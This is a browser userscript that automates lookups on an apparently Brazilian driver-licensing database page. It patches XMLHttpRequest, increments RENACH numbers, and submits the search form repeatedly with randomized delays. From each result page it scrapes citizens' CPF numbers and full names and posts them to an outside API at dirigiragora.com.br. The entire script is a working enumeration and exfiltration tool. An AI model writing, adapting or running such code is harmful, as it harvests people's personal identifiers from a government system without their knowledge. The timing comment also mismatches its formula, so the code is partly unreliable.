(function () {
  'use strict';

  const urlAlvo = "hab_consulta_dados_base_BCA_basico.aspx";

  // Cria um ID único para esta execução do script
  const meuLoopId = Date.now();
  window._dirigirAgoraActiveLoop = meuLoopId;

  // =======================================================
  // 1. LIMPEZA ANTI-DUPLICAÇÃO (MONKEY PATCH FIX)
  // =======================================================
  if (window._xhrOriginal_DirigirAgora) {
    window.XMLHttpRequest = window._xhrOriginal_DirigirAgora;
  } else {
    window._xhrOriginal_DirigirAgora = window.XMLHttpRequest;
  }
  const oldXHR = window._xhrOriginal_DirigirAgora;


  // =======================================================
  // 2. FUNÇÃO PARA INCREMENTAR O RENACH (+1)
  // =======================================================
  function incrementarRenach(renach) {
    const novoNumero = Number(renach) + 1;
    return String(novoNumero).padStart(renach.length, '0');
  }


  // =======================================================
  // 3. FUNÇÃO DA API (Agora enviando renach, cpf e nome)
  // =======================================================
  function enviarDadosParaApi(renach, cpf, nome) {
    const apiUrl = "https://api.dirigiragora.com.br/v1/simulado/postRenach";
    console.log(`🚀 [API] Enviando RENACH: ${renach} | CPF: ${cpf} | Nome: ${nome}...`);

    fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        renach: renach,
        cpf: cpf,
        nome: nome
      })
    })
    .then(response => response.json())
    .then(data => console.log(`✅ [API] Sucesso para o RENACH ${renach}:`, data))
    .catch(error => console.error(`❌ [API] Erro ao postar na API:`, error));
  }


  // =======================================================
  // 4. ANÁLISE DO DOM E GERENCIAMENTO DO LOOP
  // =======================================================
  function analisarDomNoFinal() {
    if (window._dirigirAgoraActiveLoop !== meuLoopId) {
      console.log("🛑 Loop antigo detectado e interrompido.");
      return;
    }

    let renachConsultado = localStorage.getItem('renach') || '929123339';

    // Captura os elementos necessários do HTML
    const regElement = document.getElementById("ctl00_conteudo_lblNumeroRegistroCNH");
    const cedElement = document.getElementById("ctl00_conteudo_lblNumeroCedulaCnh");
    const cpfElement = document.getElementById("ctl00_conteudo_lblCpf");
    const nomeElement = document.getElementById("ctl00_conteudo_lblNome"); // <-- Captura do Nome

    if (regElement && cedElement) {
      const registroIsZero = regElement.textContent.trim() === "0";
      const cedulaIsZero = cedElement.textContent.trim() === "0";

      if (registroIsZero && cedulaIsZero) {
        // Tratamento do CPF para garantir string com 11 dígitos
        let cpfColetado = cpfElement ? cpfElement.textContent.trim() : "";
        if (cpfColetado) {
          cpfColetado = cpfColetado.padStart(11, '0');
        }

        // Captura e limpeza do Nome
        const nomeColetado = nomeElement ? nomeElement.textContent.trim() : "";

        console.log(`🎯 [ALVO] Ambos são ZERO! RENACH: ${renachConsultado} | CPF: ${cpfColetado} | Nome: ${nomeColetado}`);
        enviarDadosParaApi(renachConsultado, cpfColetado, nomeColetado);
      } else {
        console.log(`⏭️ [OK] RENACH ${renachConsultado} possui dados (Reg: ${regElement.textContent.trim()} | Céd: ${cedElement.textContent.trim()}).`);
      }
    }

    // PREPARA O PRÓXIMO PASSO
    const proximoRenach = incrementarRenach(renachConsultado);
    localStorage.setItem('renach', proximoRenach);

    // Gera um tempo aleatório entre 2000ms (2s) e 7000ms (7s)
    const tempoEspera = Math.floor(Math.random() * (7000 - 2000 + 1)) + 5000;
    const tempoEmSegundos = (tempoEspera / 1000).toFixed(1);

    console.log(`⏱️ Aguardando ${tempoEmSegundos}s (intervalo randômico) para ir ao próximo: ${proximoRenach}...`);
    setTimeout(rodarProximaConsulta, tempoEspera);
  }


  // =======================================================
  // 5. INTERCEPTADOR XHR (Com proteção contra queda de internet)
  // =======================================================
  function newXHR() {
    const realXHR = new oldXHR();
    realXHR.addEventListener("readystatechange", function() {
      if (realXHR.readyState === 4) {
        // Se a requisição falhou por queda de rede/internet (status 0 ou offline)
        if (realXHR.status === 0 || !navigator.onLine) {
          console.warn("⚠️ [SEM INTERNET/FALHA XHR] Conexão instável ou offline. Retentando a mesma consulta em 5s...");
          setTimeout(rodarProximaConsulta, 5000);
          return;
        }

        if (realXHR.responseURL && realXHR.responseURL.includes(urlAlvo)) {
          setTimeout(analisarDomNoFinal, 100);
        }
      }
    }, false);
    return realXHR;
  }

  window.XMLHttpRequest = newXHR;


  // =======================================================
  // 6. DISPARADOR DA CONSULTA (Com verificação de conexão)
  // =======================================================
  function rodarProximaConsulta() {
    if (window._dirigirAgoraActiveLoop !== meuLoopId) return;

    // VERIFICAÇÃO DE INTERNET ANTES DE DISPARAR
    if (!navigator.onLine) {
      console.warn("⚠️ [SEM INTERNET] Dispositivo offline. Aguardando 5s para tentar novamente...");
      setTimeout(rodarProximaConsulta, 5000);
      return;
    }

    const renachParaConsultar = localStorage.getItem('renach') || '929191699';
    localStorage.setItem('renach', renachParaConsultar);

    console.log(`🔍 Iniciando busca do RENACH: ${renachParaConsultar}`);

    const selectUf = document.querySelector('[name="ctl00$conteudo$ucCondutorPesquisa$ucPesquisaBaseNacional_ddlUfRenach"]');
    const inputRenach = document.querySelector('[name="ctl00$conteudo$ucCondutorPesquisa$ucPesquisaBaseNacional_txtRenach"]');
    const btnSubmit = document.querySelector('[name="ctl00$conteudo$ucCondutorPesquisa$ucPesquisaBaseNacional_btnFiltrar"]');

    if (selectUf && inputRenach && btnSubmit) {
      selectUf.value = 'PR';
      inputRenach.value = renachParaConsultar;
      btnSubmit.click();
    } else {
      console.error("❌ Elementos do formulário não foram encontrados na página.");
    }
  }

  // Inicializa o processo
  rodarProximaConsulta();

})();